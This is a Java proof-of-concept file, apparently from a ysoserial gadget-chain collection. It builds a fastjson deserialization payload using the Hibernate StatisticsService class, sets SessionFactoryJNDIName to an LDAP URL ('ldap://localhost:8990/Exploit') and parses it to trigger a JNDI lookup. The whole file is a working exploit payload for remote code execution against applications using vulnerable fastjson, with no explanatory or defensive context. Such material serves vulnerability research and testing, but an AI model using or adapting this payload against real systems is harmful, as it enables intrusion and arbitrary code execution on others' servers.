package ysoserial.payloads.tabbyGadgetChains.hibernate4;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;


//version 3.x
public class Poc1 {
    public static void main(String[] args) {
            String poc = "{\"@type\":\"org.hibernate.jmx.StatisticsService\",\"SessionFactoryJNDIName\":\"ldap://localhost:8990/Exploit\"}\n";
            JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
